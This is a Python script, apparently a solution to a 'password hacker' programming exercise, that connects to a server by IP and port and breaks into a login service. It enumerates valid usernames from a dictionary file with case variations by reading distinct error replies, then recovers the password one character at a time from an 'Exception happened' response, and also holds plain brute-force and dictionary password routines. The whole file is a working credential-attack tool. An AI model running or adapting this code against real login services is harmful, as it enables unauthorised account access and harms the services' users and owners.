from itertools import product
import socket
import sys
import string
import json


def password_generator(length=1000000):
    possible_symbols = string.ascii_letters + string.digits
    for i in range(length):
        for message in product(possible_symbols, repeat=i+1):
            yield "".join(message)


def connect_to_server(arguments):
    _ip_address = arguments[1]
    _port = int(arguments[2])
    _client_soket = socket.socket()
    _client_soket.connect((_ip_address, _port))
    return _client_soket


def brute_force(client_socket):  # client_socket
    generator = password_generator()
    for message in generator:
        password = ''.join(message)
        client_socket.send(password.encode())
        response = client_socket.recv(1024).decode()
        if response == "Connection success!":
            print(password)
            break


def case_generator(_password) -> str:
    if not _password.isdigit():
        all_spelling_options = map(lambda x: ''.join(x),
                                   product(*([letter.lower(), letter.upper()] for letter in _password)))
        for i in all_spelling_options:
            yield i
    else:
        yield _password


def send_json_message(message):
    return 'response'


def try_dictionary_password(_dict_file, _client_socket):
    password_pool = tuple(open(_dict_file).read().split('\n'))
    for password in password_pool:
        generator = case_generator(password)
        for pas in generator:
            _client_socket.send(pas.encode())
            response = _client_socket.recv(1024).decode()
            if response == "Connection success!":
                print(pas)
                exit()


def hack_login(_dict_file, _client_socket):
    # find login first, then find password, then send request
    logins_pool = [login for login in tuple(open(_dict_file).read().split('\n')) if login]
    # iterating throug the loggins pool
    for login in logins_pool:
        # defining case-generator
        generator_logins = case_generator(login)
        # trying options from generator
        for login_variant in generator_logins:
            # creating json message to the server
            message = {"login": login_variant,
                       "password": ""}
            # sending json message to the server
            _client_socket.send(json.dumps(message).encode())
            # reading response from server
            response = _client_socket.recv(1024).decode()
            # "Wrong login!" should be ignored. once "Wrong password!" message received = login hacked,
            # and need to find the password.
            if json.loads(response)["result"] == "Wrong password!":
                # login_variant will be correct login at this step
                return login_variant


def hack_password(_client_socket, login, password_beginning=""):
    for password in password_generator(length=1):
        if password_beginning:
            password = str(password_beginning) + str(password)
        message = {"login": login, "password": password}
        # reading response from server
        _client_socket.send(json.dumps(message).encode())
        response = _client_socket.recv(1024).decode()
        #print(response)
        if json.loads(response)["result"] == "Exception happened during login":
            #print(password)
            password_beginning = password
            # print("Password at this moment:", password)
            return hack_password(_client_socket, login, password_beginning)
        if json.loads(response)["result"] == "Connection success!":
            print(json.dumps(message))
            exit()
            """
            print("passsword found:", password)
            print(json.dumps(message))
            exit()
"""


def main():
    args = sys.argv
    # args = ['hack.py', 'localhost', 9090]
    if len(args) < 3:
        print("Not enough arguments. Please provide : ip_address, port, message")
        exit()
    client_socket = connect_to_server(args)
    dictionary_file = "hacking/logins.txt"
    # try_dictionary_password(dictionary_file, client_socket)
    login = hack_login(dictionary_file, client_socket)
    if not login:
        print("sorry, no more logins in DB file")
    else:
        # print("login succesfully found:", login)
        # password = hack_password(client_socket, login)
        #print(password)
        hack_password(client_socket, login)

    client_socket.close()  # close connection


if __name__ == '__main__':
    main()
